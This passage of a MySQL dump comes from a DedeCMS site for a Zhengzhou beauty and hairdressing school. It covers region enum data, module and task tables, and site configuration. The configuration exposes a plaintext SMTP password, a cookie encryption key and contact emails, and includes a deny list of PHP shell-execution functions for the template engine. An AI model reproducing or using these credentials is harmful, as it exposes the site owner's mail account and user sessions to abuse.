县','2006.10','nativeplace',2006,2),(16930,'定兴县','2006.9','nativeplace',2007,2),(16929,'徐水县','2006.8','nativeplace',2007,2),(16928,'阜平县','2006.7','nativeplace',2007,2),(16927,'涞水县','2006.6','nativeplace',2007,2),(16926,'清苑县','2006.5','nativeplace',2007,2),(16925,'满城县','2006.4','nativeplace',2006,2),(16924,'南市区','2006.3','nativeplace',2006,2),(16923,'北市区','2006.2','nativeplace',2006,2),(16922,'新市区','2006.1','nativeplace',2006,2),(16921,'保定市','2006','nativeplace',2006,1),(16920,'沙河市','2005.19','nativeplace',2005,2),(16919,'南宫市','2005.18','nativeplace',2005,2),(16918,'临西县','2005.17','nativeplace',2005,2),(16917,'清河县','2005.16','nativeplace',2005,2),(16916,'威　县','2005.15','nativeplace',2005,2),(16915,'平乡县','2005.14','nativeplace',2005,2),(16914,'广宗县','2005.13','nativeplace',2005,2),(16913,'新河县','2005.12','nativeplace',2005,2),(16912,'巨鹿县','2005.11','nativeplace',2005,2),(16911,'宁晋县','2005.10','nativeplace',2005,2),(16910,'南和县','2005.9','nativeplace',2006,2),(16909,'任　县','2005.8','nativeplace',2006,2),(16908,'隆尧县','2005.7','nativeplace',2006,2),(16907,'柏乡县','2005.6','nativeplace',2006,2),(16906,'内丘县','2005.5','nativeplace',2006,2),(16905,'临城县','2005.4','nativeplace',2005,2),(16904,'邢台县','2005.3','nativeplace',2005,2),(16903,'桥西区','2005.2','nativeplace',2005,2),(16902,'桥东区','2005.1','nativeplace',2005,2),(16901,'邢台市','2005','nativeplace',2005,1),(16900,'武安市','2004.20','nativeplace',2004,2),(16899,'曲周县','2004.19','nativeplace',2004,2),(16898,'魏县','2004.18','nativeplace',2004,2),(16897,'馆陶县','2004.17','nativeplace',2004,2),(16896,'广平县','2004.16','nativeplace',2004,2),(16895,'鸡泽县','2004.15','nativeplace',2004,2),(16894,'邱　县','2004.14','nativeplace',2004,2),(16893,'永年县','2004.13','nativeplace',2004,2),(16892,'肥乡县','2004.12','nativeplace',2004,2),(16891,'磁　县','2004.11','nativeplace',2004,2),(16890,'涉　县','2004.10','nativeplace',2004,2),(16889,'大名县','2004.9','nativeplace',2005,2),(16888,'成安县','2004.8','nativeplace',2005,2),(16887,'临漳县','2004.7','nativeplace',2005,2),(16886,'邯郸县','2004.6','nativeplace',2005,2),(16885,'峰峰矿区','2004.5','nativeplace',2005,2),(16884,'复兴区','2004.4','nativeplace',2004,2),(16883,'丛台区','2004.3','nativeplace',2004,2),(16882,'邯山区','2004.2','nativeplace',2004,2),(16881,'市辖区','2004.1','nativeplace',2004,2),(16880,'邯郸市','2004','nativeplace',2004,1),(16879,'卢龙县','2003.7','nativeplace',2004,2),(16878,'抚宁县','2003.6','nativeplace',2004,2),(16877,'昌黎县','2003.5','nativeplace',2004,2),(16876,'青龙满族自治县','2003.4','nativeplace',2003,2),(16875,'北戴河区','2003.3','nativeplace',2003,2),(16874,'山海关区','2003.2','nativeplace',2003,2),(16873,'海港区','2003.1','nativeplace',2003,2),(16872,'秦皇岛市','2003','nativeplace',2003,1),(16871,'迁安市','2002.14','nativeplace',2002,2),(16870,'遵化市','2002.13','nativeplace',2002,2),(16869,'唐海县','2002.12','nativeplace',2002,2),(16868,'玉田县','2002.11','nativeplace',2002,2),(16867,'迁西县','2002.10','nativeplace',2002,2),(16866,'乐亭县','2002.9','nativeplace',2003,2),(16865,'滦南县','2002.8','nativeplace',2003,2),(16864,'滦　县','2002.7','nativeplace',2003,2),(16863,'丰润区','2002.6','nativeplace',2003,2),(16862,'丰南区','2002.5','nativeplace',2003,2),(16861,'开平区','2002.4','nativeplace',2002,2),(16860,'古冶区','2002.3','nativeplace',2002,2),(16859,'路北区','2002.2','nativeplace',2002,2),(16858,'路南区','2002.1','nativeplace',2002,2),(16857,'唐山市','2002','nativeplace',2002,1),(16856,'鹿泉市','2001.23','nativeplace',2001,2),(16855,'新乐市','2001.22','nativeplace',2001,2),(16854,'晋州市','2001.21','nativeplace',2001,2),(16853,'藁城市','2001.20','nativeplace',2001,2),(16852,'辛集市','2001.19','nativeplace',2001,2),(16851,'赵　县','2001.18','nativeplace',2001,2),(16850,'元氏县','2001.17','nativeplace',2001,2),(16849,'平山县','2001.16','nativeplace',2001,2),(16848,'无极县','2001.15','nativeplace',2001,2),(16847,'赞皇县','2001.14','nativeplace',2001,2),(16846,'深泽县','2001.13','nativeplace',2001,2),(16845,'高邑县','2001.12','nativeplace',2001,2),(16844,'灵寿县','2001.11','nativeplace',2001,2),(16843,'行唐县','2001.10','nativeplace',2001,2),(16842,'栾城县','2001.9','nativeplace',2002,2),(16841,'正定县','2001.8','nativeplace',2002,2),(16840,'井陉县','2001.7','nativeplace',2002,2),(16839,'裕华区','2001.6','nativeplace',2002,2),(16838,'井陉矿区','2001.5','nativeplace',2002,2),(16837,'新华区','2001.4','nativeplace',2001,2),(16836,'桥西区','2001.3','nativeplace',2001,2),(16835,'桥东区','2001.2','nativeplace',2001,2),(16834,'长安区','2001.1','nativeplace',2001,2),(16833,'石家庄市','2001','nativeplace',2001,1),(16832,'河北省','2000','nativeplace',2000,0),(16831,'蓟　县','1518','nativeplace',1518,1),(16830,'静海县','1517','nativeplace',1517,1),(16829,'宁河县','1516','nativeplace',1516,1),(16828,'宝坻区','1515','nativeplace',1515,1),(16827,'武清区','1514','nativeplace',1514,1),(16826,'北辰区','1513','nativeplace',1513,1),(16825,'津南区','1512','nativeplace',1512,1),(16824,'西青区','1511','nativeplace',1511,1),(16823,'东丽区','1510','nativeplace',1510,1),(16822,'大港区','1509','nativeplace',1509,1),(16821,'汉沽区','1508','nativeplace',1508,1),(16820,'塘沽区','1507','nativeplace',1507,1),(16819,'红桥区','1506','nativeplace',1506,1),(16818,'河北区','1505','nativeplace',1505,1),(16817,'南开区','1504','nativeplace',1504,1),(16816,'河西区','1503','nativeplace',1503,1),(16815,'河东区','1502','nativeplace',1502,1),(16814,'和平区','1501','nativeplace',1501,1),(16813,'天津市','1500','nativeplace',1500,0),(16812,'延庆县','1018','nativeplace',1018,1),(16811,'密云县','1017','nativeplace',1017,1),(16810,'平谷区','1016','nativeplace',1016,1),(16809,'怀柔区','1015','nativeplace',1015,1),(16808,'大兴区','1014','nativeplace',1014,1),(16807,'昌平区','1013','nativeplace',1013,1),(16806,'顺义区','1012','nativeplace',1012,1),(16805,'通州区','1011','nativeplace',1011,1),(16804,'房山区','1010','nativeplace',1010,1),(16803,'门头沟区','1009','nativeplace',1009,1),(16802,'海淀区','1008','nativeplace',1008,1),(16801,'石景山区','1007','nativeplace',1007,1),(16800,'丰台区','1006','nativeplace',1006,1),(16799,'朝阳区','1005','nativeplace',1005,1),(16798,'宣武区','1004','nativeplace',1004,1),(16797,'崇文区','1003','nativeplace',1003,1),(16796,'西城区','1002','nativeplace',1002,1),(16795,'东城区','1001','nativeplace',1001,1),(16794,'北京市','1000','nativeplace',1000,0);
/*!40000 ALTER TABLE `dede_sys_enum` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_sys_module`
--

DROP TABLE IF EXISTS `dede_sys_module`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_sys_module` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `hashcode` char(32) NOT NULL DEFAULT '',
  `modname` varchar(30) NOT NULL DEFAULT '',
  `indexname` varchar(20) NOT NULL DEFAULT '',
  `indexurl` varchar(30) NOT NULL DEFAULT '',
  `ismember` tinyint(4) NOT NULL DEFAULT '1',
  `menustring` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_sys_module`
--

LOCK TABLES `dede_sys_module` WRITE;
/*!40000 ALTER TABLE `dede_sys_module` DISABLE KEYS */;
INSERT INTO `dede_sys_module` VALUES (1,'0cce60bc0238aa03804682c801584991','百度新闻','','',0,''),(2,'1f35620fb42d452fa2bdc1dee1690f92','文件管理器','','',0,''),(4,'b437d85a7a7bc778c9c79b5ec36ab9aa','友情链接','','',0,''),(5,'acb8b88eb4a6d4bfc375c18534f9439e','投票模块','','',0,''),(6,'572606600345b1a4bb8c810bbae434cc','挑错管理','','',0,''),(7,'533c5b843ded8752b9857cc7c8e5b455','得德广告模块','','',0,'<m:top name=\'德得广告\' display=\'block\'>\r\n<m:item name=\'德得模块\' link=\'mda_main.php\' rank=\'plus_广告管理\' target=\'main\'/>\r\n<m:item name=\'广告管理\' link=\'mda_main.php?dopost=place\' rank=\'plus_广告管理\' target=\'main\'/>\r\n<m:item name=\'查看报表\' link=\'mda_main.php?dopost=report\' rank=\'plus_广告管理\' target=\'main\'/>\r\n<m:item name=\'结算中心\' link=\'mda_main.php?dopost=account\' rank=\'plus_广告管理\' target=\'main\'/>\r\n<m:item name=\'德得设置\' link=\'mda_main.php?dopost=setting\' rank=\'plus_广告管理\' target=\'main\'/>\r\n</m:top>'),(9,'a9e11e317613f278919bd621d0f4a0b8','幻灯片管理','','',0,''),(10,'6de8b72c6b4c093c7b52f55f3f9b10bc','幻灯片管理','','',0,'');
/*!40000 ALTER TABLE `dede_sys_module` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_sys_set`
--

DROP TABLE IF EXISTS `dede_sys_set`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_sys_set` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `sname` char(20) NOT NULL DEFAULT '',
  `items` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_sys_set`
--

LOCK TABLES `dede_sys_set` WRITE;
/*!40000 ALTER TABLE `dede_sys_set` DISABLE KEYS */;
INSERT INTO `dede_sys_set` VALUES (1,'nature','性格外向,性格内向,活泼开朗,沉默寡言,幽默,稳重,轻浮,冲动,坚强,脆弱,幼稚,成熟,能说会道,自私,真诚,独立,依赖,任性,自负,自卑,温柔体贴,神经质,拜金,小心翼翼,暴躁,倔强,逆来顺受,不拘小节,婆婆妈妈,交际广泛,豪爽,害羞,狡猾善变,耿直,虚伪,乐观向上,悲观消极,郁郁寡欢,孤僻,难以琢磨,胆小怕事,敢做敢当,助人为乐,老实,守旧,敏感,迟钝,武断,果断,优柔寡断,暴力倾向,刻薄,损人利己,附庸风雅,时喜时悲,患得患失,快言快语,豪放不羁,多愁善感,循规蹈矩'),(2,'language','普通话,上海话,广东话,英语,日语,韩语,法语,意大利语,德语,西班牙语,俄语,阿拉伯语');
/*!40000 ALTER TABLE `dede_sys_set` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_sys_task`
--

DROP TABLE IF EXISTS `dede_sys_task`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_sys_task` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `taskname` varchar(50) NOT NULL,
  `dourl` varchar(100) NOT NULL,
  `islock` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `runtype` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `runtime` varchar(10) DEFAULT '0000',
  `starttime` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `freq` tinyint(2) unsigned NOT NULL DEFAULT '0',
  `lastrun` int(10) unsigned NOT NULL DEFAULT '0',
  `description` varchar(250) NOT NULL,
  `parameter` text,
  `settime` int(10) unsigned NOT NULL DEFAULT '0',
  `sta` enum('运行','成功','失败') DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_sys_task`
--

LOCK TABLES `dede_sys_task` WRITE;
/*!40000 ALTER TABLE `dede_sys_task` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_sys_task` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_sysconfig`
--

DROP TABLE IF EXISTS `dede_sysconfig`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_sysconfig` (
  `aid` smallint(8) unsigned NOT NULL DEFAULT '0',
  `varname` varchar(20) NOT NULL DEFAULT '',
  `info` varchar(100) NOT NULL DEFAULT '',
  `groupid` smallint(6) NOT NULL DEFAULT '1',
  `type` varchar(10) NOT NULL DEFAULT 'string',
  `value` text,
  PRIMARY KEY (`varname`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_sysconfig`
--

LOCK TABLES `dede_sysconfig` WRITE;
/*!40000 ALTER TABLE `dede_sysconfig` DISABLE KEYS */;
INSERT INTO `dede_sysconfig` VALUES (1,'cfg_basehost','站点根网址',1,'string','http://www.zzhqxx.com'),(2,'cfg_cmspath','DedeCMS安装目录',2,'string',''),(3,'cfg_cookie_encode','cookie加密码',2,'string','huPrGMnYYgUwiiC7AaQ4t03mkNdg'),(4,'cfg_indexurl','网页主页链接',1,'string','/'),(5,'cfg_backup_dir','数据备份目录（在data目录内）',2,'string','backupdata'),(6,'cfg_indexname','主页链接名',1,'string','主页'),(7,'cfg_webname','网站名称',1,'string','环球美容美发学校_河南郑州美容美发化妆美甲培训【官网】33年品牌名校'),(8,'cfg_adminemail','网站发信EMAIL',2,'string','453966373@qq.com'),(9,'cfg_html_editor','Html编辑器（ckeditor,需要fck的用户可以去官网下载）',2,'string','ueditor'),(10,'cfg_arcdir','文档HTML默认保存路径',1,'string','/a'),(11,'cfg_medias_dir','图片/上传文件默认路径',1,'string','/uploads'),(12,'cfg_ddimg_width','缩略图默认宽度',3,'number','240'),(13,'cfg_ddimg_height','缩略图默认高度',3,'number','180'),(63,'cfg_album_width','图集默认显示图片的大小',3,'number','800'),(15,'cfg_imgtype','图片浏览器文件类型',3,'string','jpg|gif|png'),(16,'cfg_softtype','允许上传的软件类型',3,'bstring','zip|gz|rar|iso|doc|xsl|ppt|wps'),(17,'cfg_mediatype','允许的多媒体文件类型',3,'bstring','swf|mpg|mp3|rm|rmvb|wmv|wma|wav|mid|mov'),(18,'cfg_specnote','专题的最大节点数',2,'number','6'),(19,'cfg_list_symbol','栏目位置的间隔符号',2,'string',' > '),(20,'cfg_notallowstr','禁用词语（系统将直接停止用户动作）<br/>用|分开，但不要在结尾加|',5,'bstring','非典|艾滋病|阳痿'),(21,'cfg_feedbackcheck','评论及留言(是/否)需审核',5,'bool','N'),(22,'cfg_keyword_replace','关键字替换(是/否)使用本功能会影响HTML生成速度',2,'bool','Y'),(23,'cfg_fck_xhtml','编辑器(是/否)使用XHTML',1,'bool','N'),(24,'cfg_df_style','模板默认风格',1,'string','hqxx'),(25,'cfg_multi_site','(是/否)支持多站点，开启此项后附件、栏目连接、arclist内容启用绝对网址',2,'bool','N'),(58,'cfg_rm_remote','远程图片本地化',7,'bool','Y'),(27,'cfg_dede_log','(是/否)开启管理日志',2,'bool','N'),(28,'cfg_powerby','网站版权信息',1,'bstring','Copyright &copy; 2019 郑州市中原环球美容美发晚装职业技能培训学校  版权所有'),(722,'cfg_jump_once','跳转网址是否直接跳转？（否则显示中转页）',7,'bool','Y'),(723,'cfg_task_pwd','系统计划任务客户端许可密码<br/>(需要客户端，通常不会太重要)',7,'string',''),(29,'cfg_arcsptitle','(是/否)开启分页标题，开启会影响HTML生成速度',6,'bool','N'),(30,'cfg_arcautosp','(是/否)开启长文章自动分页',6,'bool','N'),(31,'cfg_arcautosp_size','文章自动分页大小（单位: K）',6,'number','5'),(32,'cfg_auot_description','自动摘要长度（0-250，0表示不启用）',7,'number','240'),(33,'cfg_ftp_host','FTP主机',2,'string',''),(34,'cfg_ftp_port','FTP端口',2,'number','21'),(35,'cfg_ftp_user','FTP用户名',2,'string',''),(36,'cfg_ftp_pwd','FTP密码',2,'string',''),(37,'cfg_ftp_root','网站根在FTP中的目录',2,'string','/'),(38,'cfg_ftp_mkdir','是否强制用FTP创建目录',2,'bool','N'),(39,'cfg_feedback_ck','评论加验证码重确认',5,'bool','Y'),(40,'cfg_list_son','上级列表是否包含子类内容',6,'bool','Y'),(41,'cfg_mb_open','是否开启会员功能',4,'bool','N'),(42,'cfg_mb_album','是否开启会员图集功能',4,'bool','N'),(43,'cfg_mb_upload','是否允许会员上传非图片附件',4,'bool','N'),(44,'cfg_mb_upload_size','会员上传文件大小(K)',4,'number','1024'),(45,'cfg_mb_sendall','是否开放会员对自定义模型投稿',4,'bool','Y'),(46,'cfg_mb_rmdown','是否把会员指定的远程文档下载到本地',4,'bool','Y'),(47,'cfg_cli_time','服务器时区设置',2,'number','8'),(48,'cfg_mb_addontype','会员附件许可的类型',4,'bstring','swf|mpg|mp3|rm|rmvb|wmv|wma|wav|mid|mov|zip|rar|doc|xsl|ppt|wps'),(49,'cfg_mb_max','会员附件总大小限制(MB)',4,'number','500'),(20,'cfg_replacestr','替换词语（词语会被替换成***）<br/>用|分开，但不要在结尾加|',5,'bstring','她妈|它妈|他妈|你妈|去死|贱人'),(719,'cfg_makeindex','发布文章后马上更新网站主页',6,'bool','N'),(51,'cfg_keyword_like','使用关键词关连文章',6,'bool','N'),(52,'cfg_index_max','网站主页调用函数最大索引文档数<br>不适用于经常单栏目采集过多内容的网站<br>不启用本项此值设置为0即可',6,'number','10000'),(53,'cfg_index_cache','arclist标签调用缓存<br />(0 不启用，大于0值为多少秒)',6,'number','86400'),(54,'cfg_tplcache','是否启用模板缓存',6,'bool','Y'),(55,'cfg_tplcache_dir','模板缓存目录',6,'string','/data/tplcache'),(56,'cfg_makesign_cache','发布/修改单个文档是否使用调用缓存',6,'bool','N'),(59,'cfg_arc_dellink','删除非站内链接',7,'bool','N'),(60,'cfg_arc_autopic','提取第一张图片作为缩略图',7,'bool','N'),(61,'cfg_arc_autokeyword','自动提取关键字',7,'bool','Y'),(62,'cfg_title_maxlen','文档标题最大长度<br>改此参数后需要手工修改数据表',7,'number','60'),(64,'cfg_check_title','发布文档时是否检测重复标题',7,'bool','Y'),(65,'cfg_album_row','图集多行多列样式默认行数',3,'number','3'),(66,'cfg_album_col','图集多行多列样式默认列数',3,'number','4'),(67,'cfg_album_pagesize','图集多页多图每页显示最大数',3,'number','12'),(68,'cfg_album_style','图集默认样式<br />1为多页多图,2为多页单图,3为缩略图列表',3,'number','2'),(69,'cfg_album_ddwidth','图集默认缩略图大小',3,'number','200'),(70,'cfg_mb_notallow','不允许注册的会员id',4,'bstring','www,bbs,ftp,mail,user,users,admin,administrator'),(71,'cfg_mb_idmin','用户id最小长度',4,'number','3'),(72,'cfg_mb_pwdmin','用户密码最小长度',4,'number','3'),(73,'cfg_md_idurl','是否严格限定会员登录id<br>允许会员使用二级域名必须设置此项',4,'bool','N'),(74,'cfg_mb_rank','注册会员默认级别<br>[会员权限管理中]查看级别代表的数字',4,'number','10'),(76,'cfg_feedback_time','两次评论至少间隔时间(秒钟)',5,'number','30'),(77,'cfg_feedback_numip','每个IP一小时内最大评论数',5,'number','30'),(78,'cfg_md_mailtest','是否限制Email只能注册一个帐号',4,'bool','N'),(79,'cfg_mb_spacesta','会员使用权限开通状态<br>(-10 邮件验证 -1 手工审核, 0 没限制)',4,'number','-10'),(728,'cfg_mb_allowreg','是否允许新会员注册',4,'bool','Y'),(729,'cfg_mb_adminlock','是否禁止访问管理员帐号的空间',4,'bool','N'),(81,'cfg_vdcode_member','会员投稿是否使用验证码',5,'bool','Y'),(83,'cfg_mb_cktitle','会员投稿是否检测重复标题',5,'bool','Y'),(84,'cfg_mb_editday','投稿多长时间后不能再修改[天]',5,'number','7'),(729,'cfg_sendarc_scores','投稿可获取积分',5,'number','10'),(88,'cfg_caicai_sub','被踩扣除文章好评度',5,'number','2'),(89,'cfg_caicai_add','被顶扣除文章好评度',5,'number','2'),(90,'cfg_feedback_add','详细好评可获好评度',5,'number','5'),(91,'cfg_feedback_sub','详细恶评扣除好评度',5,'number','5'),(730,'cfg_sendfb_scores','参与评论可获积分',5,'number','3'),(92,'cfg_search_max','最大搜索检查文档数',6,'number','50000'),(93,'cfg_search_maxrc','最大返回搜索结果数',6,'number','300'),(94,'cfg_search_time','搜索间隔时间(秒/对网站所有用户)',6,'number','3'),(95,'cfg_baidunews_limit','百度新闻xml更新新闻数量 最大100',8,'string','100'),(223,'cfg_smtp_port','smtp服务器端口',2,'string','25'),(221,'cfg_sendmail_bysmtp','是否启用smtp方式发送邮件',2,'bool','Y'),(222,'cfg_smtp_server','smtp服务器',2,'string','smtp.qq.com'),(224,'cfg_smtp_usermail','SMTP服务器的用户邮箱',2,'string','desdev@vip.qq.com'),(225,'cfg_smtp_user','SMTP服务器的用户帐号',2,'string','desdev'),(226,'cfg_smtp_password','SMTP服务器的用户密码',2,'string','7260444huxiao'),(96,'cfg_updateperi','百度新闻xml更新时间 （单位：分钟）',8,'string','15'),(227,'cfg_online_type','在线支付网关类型',2,'string','nps'),(706,'cfg_upload_switch','删除文章文件同时删除相关附件文件',2,'bool','Y'),(708,'cfg_rewrite','是否使用伪静态',2,'bool','Y'),(707,'cfg_allsearch_limit','网站全局搜索时间限制',2,'string','1'),(709,'cfg_delete','文章回收站(是/否)开启',2,'bool','Y'),(710,'cfg_keywords','站点默认关键字',1,'string','美容学校,美发学校,美容师培训,美容美发培训,美容美发学校,郑州美发学校,郑州美容学校,郑州化妆学校,河南美容学校,河南美发学校,环球美容美发学校,环球美容美发学院,'),(711,'cfg_description','站点描述',1,'bstring','郑州环球美容美发学校开设美容培训、美发培训、化妆培训、半永久培训、美甲培训、晚装培训等课程，是河南省郑州市正规的美容美发培训学校，办学33年来为社会输送大批美容美发化妆精英人才！'),(712,'cfg_beian','网站备案号',1,'string','豫ICP备14019212号-3'),(713,'cfg_need_typeid2','是否启用副栏目',6,'bool','Y'),(72,'cfg_mb_pwdtype','前台密码验证类型：默认32 — 32位md5，可选：<br />l16 — 前16位， r16 — 后16位， m16 — 中间16位',4,'string','32'),(716,'cfg_cache_type','id 文档ID，content 标签最终内容<br />(修改此变量后必须更新系统缓存)',6,'string','id'),(717,'cfg_max_face','会员上传头像大小限制(单位：KB)',3,'number','50'),(718,'cfg_typedir_df','栏目网址使用目录名（不显示默认页，即是 /a/abc/ 形式）',2,'bool','Y'),(719,'cfg_make_andcat','发表文章后马上更新相关栏目',6,'bool','N'),(720,'cfg_make_prenext','发表文章后马上更新上下篇',6,'bool','Y'),(721,'cfg_feedback_forbid','是否禁止所有评论(将包括禁止顶踩等)',5,'bool','N'),(724,'cfg_addon_domainbind','附件目录是否绑定为指定的二级域名',7,'bool','N'),(725,'cfg_addon_domain','附件目录的二级域名',7,'string',''),(726,'cfg_df_dutyadmin','默认责任编辑(dutyadmin)',7,'string','admin'),(727,'cfg_mb_allowncarc','是否允许用户空间显示未审核文章',4,'bool','Y'),(730,'cfg_mb_spaceallarc','会员空间中所有文档的频道ID(不限为0)',4,'number','0'),(731,'cfg_face_adds','上传头像增加积分',5,'number','10'),(732,'cfg_moreinfo_adds','填写详细资料增加积分',5,'number','20'),(733,'cfg_money_scores','多少积分可以兑换一个金币',5,'number','50'),(734,'cfg_mb_wnameone','是否允许用户笔名/昵称重复',4,'bool','N'),(735,'cfg_arc_dirname','是否允许用目录作为文档文件名<br />文档命名规则需改为：{typedir}/{aid}/index.html',7,'bool','Y'),(736,'cfg_puccache_time','需缓存内容全局缓存时间(秒)',6,'number','36000'),(737,'cfg_arc_click','文档默认点击数(-1表示随机50-200)',7,'number','-1'),(738,'cfg_addon_savetype','附件保存形式(按data函数日期参数)',3,'string','ym'),(739,'cfg_qk_uploadlit','异步上传缩略图(空间太不稳定的用户关闭此项)',3,'bool','Y'),(740,'cfg_login_adds','登录会员中心获积分',5,'number','2'),(741,'cfg_userad_adds','会员推广获积分',5,'number','10'),(742,'cfg_ddimg_full','缩略图是否使用强制大小(对背景填充)',3,'bool','N'),(743,'cfg_ddimg_bgcolor','缩略图空白背景填充颜色(0-白,1-黑)',3,'number','0'),(744,'cfg_replace_num','文档内容同一关键词替换次数(0为全部替换)',7,'number','2'),(745,'cfg_uplitpic_cut','上传缩略图后是否马上弹出裁剪框',3,'bool','Y'),(746,'cfg_album_mark','图集是否使用水印(小图也会受影响)',3,'bool','N'),(747,'cfg_mb_feedcheck','会员动态是否需要审核',4,'bool','N'),(748,'cfg_mb_msgischeck','会员状态是否需要审核',4,'bool','N'),(749,'cfg_mb_reginfo','注册是否需要完成详细资料的填写',4,'bool','Y'),(750,'cfg_remote_site','是否启用远程站点',2,'bool','N'),(751,'cfg_title_site','是否发布和编辑文档时远程发布(启用远程站点的前提下)',2,'bool','N'),(752,'cfg_mysql_type','数据库类型（支持mysql和mysqli）',2,'string','mysql'),(753,'cfg_sphinx_article','是否启用文章全文检索功能（需配置sphinx服务器）',7,'bool','N'),(754,'cfg_sphinx_host','Sphinx服务器主机地址',7,'string','localhost'),(755,'cfg_sphinx_port','Sphinx服务器端口号',7,'number','9312'),(14,'cfg_domain_cookie','跨域共享cookie的域名(例如: .dedecms.com)',2,'string',''),(756,'cfg_memcache_enable','是否启用memcache缓存，如果为否(N)，默认使用文件缓存',6,'bool','N'),(757,'cfg_memcache_mc_defa','默认memcache缓存服务器地址',6,'string','memcache://127.0.0.1:11211/default127'),(758,'cfg_memcache_mc_oth','附加memcache缓存服务器地址',6,'string',''),(759,'cfg_cross_sectypeid','支持交叉栏目显示副栏目内容',7,'bool','N'),(760,'cfg_digg_update','顶踩缓存异步更新间隔（0为不缓存）',6,'number','0'),(761,'cfg_feedback_guest','是否允许匿名评论',5,'bool','N'),(0,'cfg_disable_funs','模板引擎禁用PHP函数',7,'bstring','phpinfo,eval,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents'),(0,'cfg_disable_tags','模板引擎禁用标签',7,'bstring','php'),(762,'cfg_companyaddress','公司地址',1,'string','郑州市中原区桐柏北路98号'),(763,'cfg_mobile','手机站域名',1,'string','http://m.zzhqxx.com');
/*!40000 ALTER TABLE `dede_sysconfig` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_tagindex`
--

DROP TABLE IF EXISTS `dede_tagindex`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_tagindex` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `tag` char(12) NOT NULL DEFAULT '',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `count` int(10) unsigned NOT NULL DEFAULT '0',
  `total` int(10) unsigned NOT NULL DEFAULT '0',
  `weekcc` int(10) unsigned NOT NULL DEFAULT '0',
  `monthcc` int(10) unsigned NOT NULL DEFAULT '0',
  `weekup` int(10) unsigned NOT NULL DEFAULT '0',
  `monthup` int(10) unsigned NOT NULL DEFAULT '0',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_tagindex`
--

LOCK TABLES `dede_tagindex` WRITE;
/*!40000 ALTER TABLE `dede_tagindex` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_tagindex` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_taglist`
--

DROP TABLE IF EXISTS `dede_taglist`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_taglist` (
  `tid` int(10) unsigned NOT NULL DEFAULT '0',
  `aid` int(10) unsigned NOT NULL DEFAULT '0',
  `arcrank` smallint(6) NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tag` varchar(12) NOT NULL DEFAULT '',
  PRIMARY KEY (`tid`,`aid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_taglist`
--

LOCK TABLES `dede_taglist` WRITE;
/*!40000 ALTER TABLE `dede_taglist` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_taglist` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_uploads`
--

DROP TABLE IF EXISTS `dede_uploads`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_uploads` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `arcid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `title` char(60) NOT NULL DEFAULT '',
  `url` char(80) NOT NULL DEFAULT '',
  `mediatype` smallint(6) NOT NULL DEFAULT '1',
  `width` char(10) NOT NULL DEFAULT '',
  `height` char(10) NOT NULL DEFAULT '',
  `playtime` char(10) NOT NULL DEFAULT '',
  `filesize` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`aid`),
  KEY `memberid` (`mid`),
  KEY `arcid` (`arcid`)
) ENGINE=MyISAM AUTO_INCREMENT=162 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_uploads`
--

LOCK TABLES `dede_uploads` WRITE;
